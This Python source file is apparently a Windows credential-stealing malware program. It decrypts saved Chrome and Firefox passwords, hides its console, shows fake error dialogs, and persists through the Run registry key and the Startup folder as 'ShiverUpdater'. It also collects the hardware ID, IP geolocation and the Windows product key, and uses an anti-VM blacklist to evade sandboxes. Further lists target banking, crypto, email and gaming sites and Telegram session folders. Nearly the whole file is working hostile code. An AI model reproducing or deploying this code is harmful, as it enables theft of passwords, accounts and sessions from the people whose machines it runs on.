import os
import sys
import re
import json
import base64
import random
import string
import subprocess
import shutil
import ctypes
import time
import sqlite3
import hashlib
import hmac
from datetime import datetime
from Crypto.Cipher import AES
from ctypes import windll, wintypes, byref, cdll, POINTER, c_char, create_string_buffer

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def get_data(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = create_string_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def crypt_unprotect_data(encrypted_bytes, entropy=b''):
    if not encrypted_bytes:
        return None
    buffer_in = create_string_buffer(encrypted_bytes)
    buffer_entropy = create_string_buffer(entropy)
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return get_data(blob_out)

def decrypt_chrome_password(buff, master_key):
    try:
        if isinstance(buff, str):
            buff = buff.encode('latin-1')
        if len(buff) < 19:
            return ''
        start = buff[3:15]
        middle = buff[15:-16]
        end = buff[-16:]
        try:
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=start)
            decrypted = cipher.decrypt_and_verify(middle, end)
        except:
            cipher2 = AES.new(master_key, AES.MODE_GCM, nonce=start)
            decrypted = cipher2.decrypt(middle)
        return decrypted.decode('utf-8', errors='ignore')
    except:
        try:
            result = crypt_unprotect_data(buff)
            if result:
                return result.decode('utf-8', errors='ignore')
        except:
            pass
        return ''

def get_master_key(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        os_crypt = local_state.get('os_crypt', {})
        encrypted_key = os_crypt.get('encrypted_key')
        if not encrypted_key:
            return None
        encrypted_key = base64.b64decode(encrypted_key)
        if encrypted_key[:5] == b'DPAPI':
            encrypted_key = encrypted_key[5:]
        master_key = crypt_unprotect_data(encrypted_key)
        return master_key
    except:
        return None

def get_firefox_master_key(profile_path):
    key4_path = os.path.join(profile_path, 'key4.db')
    if not os.path.exists(key4_path):
        return None
    try:
        conn = sqlite3.connect(key4_path)
        cursor = conn.cursor()
        cursor.execute("SELECT item1, item2 FROM metadata WHERE id='password'")
        row = cursor.fetchone()
        if not row:
            conn.close()
            return None
        global_salt = row[0]
        item2 = row[1]
        conn.close()
        if not global_salt or not item2:
            return None
        entry_salt = item2[:32]
        ciphertext = item2[32:]
        k1 = hashlib.pbkdf2_hmac('sha256', global_salt + entry_salt, b'', 1, 32)
        cipher = AES.new(k1[:16], AES.MODE_CBC, iv=entry_salt[16:32])
        decrypted = cipher.decrypt(ciphertext[:32])
        return decrypted[:16]
    except:
        return None

def decrypt_firefox_login(encrypted_b64, master_key):
    try:
        raw = base64.b64decode(encrypted_b64)
        if len(raw) < 32:
            return None
        iv = raw[:16]
        ciphertext = raw[16:-16]
        tag = raw[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8', errors='ignore')
    except:
        try:
            raw = base64.b64decode(encrypted_b64)
            if len(raw) < 32:
                return None
            iv = raw[:16]
            ciphertext = raw[16:-16]
            tag = raw[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(ciphertext)
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return None

def get_appdata():
    return os.getenv('APPDATA')

def get_localappdata():
    return os.getenv('LOCALAPPDATA')

def get_temp():
    return os.getenv('TEMP')

def get_userprofile():
    return os.getenv('USERPROFILE')

def generate_id(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def hide_console():
    try:
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        user32.ShowWindow.argtypes = [wintypes.HWND, wintypes.INT]
        user32.ShowWindow.restype = wintypes.BOOL
        user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
    except:
        pass

def show_fake_error(title, message, icon='error'):
    icons = {
        'error': 0x10,
        'warning': 0x30,
        'info': 0x40,
        'question': 0x20
    }
    try:
        user32 = ctypes.windll.user32
        user32.MessageBoxW.argtypes = [wintypes.HWND, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.UINT]
        user32.MessageBoxW.restype = wintypes.INT
        user32.MessageBoxW(0, message, title, icons.get(icon, 0x10))
    except:
        pass

def add_to_startup():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'ShiverUpdater', 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        return
    except:
        pass
    try:
        startup_folder = os.path.join(get_appdata(), r'Microsoft\Windows\Start Menu\Programs\Startup')
        shutil.copy2(sys.executable, os.path.join(startup_folder, 'ShiverUpdater.exe'))
    except:
        pass

def get_hwid():
    try:
        output = subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore').strip().split('\n')
        return output[1].strip() if len(output) > 1 else 'Unknown'
    except:
        pass
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Cryptography')
        hwid = winreg.QueryValueEx(key, 'MachineGuid')[0]
        winreg.CloseKey(key)
        return str(hwid)
    except:
        return 'Unknown'

def get_ip_geo():
    import requests
    urls = ['https://ip-api.com/json/', 'http://ip-api.com/json/']
    for url in urls:
        try:
            r = requests.get(url, timeout=10)
            data = r.json()
            if data.get('status') == 'success' or 'query' in data:
                return (data.get('query', 'Unknown'), data.get('country', 'Unknown'),
                        data.get('city', 'Unknown'), data.get('isp', 'Unknown'),
                        data.get('org', 'Unknown'), data.get('as', 'Unknown'),
                        data.get('regionName', 'Unknown'), data.get('zip', 'Unknown'),
                        data.get('lat', 0), data.get('lon', 0))
        except:
            continue
    return ('Unknown',) * 10

def get_windows_key():
    try:
        output = subprocess.check_output('wmic path SoftwareLicensingService get OA3xOriginalProductKey', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
        for line in output.split('\n'):
            line = line.strip()
            if line and '-' in line and 'OA3x' not in line:
                return line
    except:
        pass
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform')
        product_key = winreg.QueryValueEx(key, 'BackupProductKeyDefault')[0]
        winreg.CloseKey(key)
        if product_key:
            return str(product_key)
    except:
        pass
    return 'Not Found'

ANTI_VM_BLACKLIST = {
    'hwid': ['00000000-0000-0000-0000-000000000000'],
    'hostname': [
        'DESKTOP-19OLLTD', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R',
        'DESKTOP-4U8DTF8', 'DESKTOP-54XGX6F', 'DESKTOP-5OV9S0O',
        'DESKTOP-6AKQQAM', 'DESKTOP-6BMFT65', 'DESKTOP-70T5SDX',
        'DESKTOP-7AFSTDP', 'DESKTOP-7XC6GEZ', 'DESKTOP-8K9D93B',
        'DESKTOP-AHGXKTV', 'DESKTOP-B0T93D6', 'DESKTOP-BGN5L8Y',
        'DESKTOP-CBGPFEE', 'DESKTOP-CDQE7VN', 'DESKTOP-CNFVLMW',
        'DESKTOP-CRCCCOT', 'DESKTOP-D019GDM', 'DESKTOP-D4FEN3M',
        'DESKTOP-DE369SE', 'DESKTOP-DIL6IYA', 'DESKTOP-ECWZXY2',
        'DESKTOP-F7BGEN9', 'DESKTOP-FSHHZLJ', 'DESKTOP-G4CWFLF',
        'DESKTOP-GLBAZXT', 'DESKTOP-GNQZM0O', 'DESKTOP-GPPK5VQ',
        'DESKTOP-HQLUWFA', 'DESKTOP-HSS0DJ9', 'DESKTOP-IAPKN1P',
        'DESKTOP-ION5ZSB', 'DESKTOP-JQPIFWD', 'DESKTOP-NAKFFMT',
        'DESKTOP-NKP0I4P', 'DESKTOP-NTU7VUO', 'DESKTOP-RCA3QWX',
        'DESKTOP-VKNFFB6', 'DESKTOP-VRSQLAG', 'DESKTOP-W8JLV9V',
        'DESKTOP-WG3MYJS', 'DESKTOP-WI8CLET', 'DESKTOP-XOY7MHS',
        'DESKTOP-Y8ASUIL', 'DESKTOP-YW9UO1H', 'DESKTOP-ZJF9KAN',
        'DESKTOP-ZMYEHDA', 'DESKTOP-ZNCAEAM', 'DESKTOP-ZOJJ8KL',
        'DESKTOP-ZV9GVYL', 'DESKTOP-LTMCKLA', 'DESKTOP-FLTWYYU',
        'DESKTOP-WA2BY3L', 'DESKTOP-UBDJJ0A', 'DESKTOP-KXP5YFO',
    ],
    'username': [
        'WDAGUtilityAccount', 'Abby', 'Amy', 'AppOnFlySupport', 'ASPNET',
        'azure', 'DefaultAccount', 'Frank', 'fred', 'george', 'Guest',
        'Harry Johnson', 'hmarc', 'John', 'jude', 'Julia', 'Lisa',
        'Louise', 'Lucas', 'mike', 'Mr.None', 'Paul Jones', 'server',
        'Steve', 'test', 'User01',
    ]
}

def check_anti_vm():
    hwid = get_hwid().upper()
    hostname = os.environ.get('COMPUTERNAME', '').upper()
    username = os.environ.get('USERNAME', '').upper()
    if hwid in [x.upper() for x in ANTI_VM_BLACKLIST['hwid']]:
        return True
    if hostname in [x.upper() for x in ANTI_VM_BLACKLIST['hostname']]:
        return True
    if username in [x.upper() for x in ANTI_VM_BLACKLIST['username']]:
        return True
    try:
        output = subprocess.check_output('wmic computersystem get model', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore').lower()
        for term in ['virtual', 'vmware', 'virtualbox', 'qemu', 'xen']:
            if term in output:
                return True
    except:
        pass
    return False

BROWSER_KEYWORDS = [
    'mail', 'gmail', 'outlook', 'hotmail', 'yahoo',
    'steam', 'discord', 'riotgames', 'epicgames',
    'instagram', 'tiktok', 'twitter', 'x.com', 'facebook',
    'youtube', 'twitch', 'reddit',
    'roblox', 'minecraft', 'spotify', 'netflix',
    'paypal', 'binance', 'coinbase', 'crypto',
    'amazon', 'ebay', 'aliexpress', 'shopify',
    'bank', 'card', 'credit', 'visa', 'mastercard',
    'sellix', 'stripe', 'patreon',
    'telegram', 'whatsapp', 'signal',
    'uber', 'disney', 'hbo', 'xbox', 'playstation',
    'linkedin', 'pinterest', 'tumblr', 'snapchat',
    'origin', 'uplay', 'battlenet', 'nintendo',
    'expressvpn', 'nordvpn', 'proton',
    'github', 'gitlab', 'bitbucket',
]

TELEGRAM_PATHS = [
    get_appdata() + r'\Telegram Desktop\tdata',
    get_appdata() + r'\Telegram Desktop\tdata\D877F783D5D3EF8C',
]
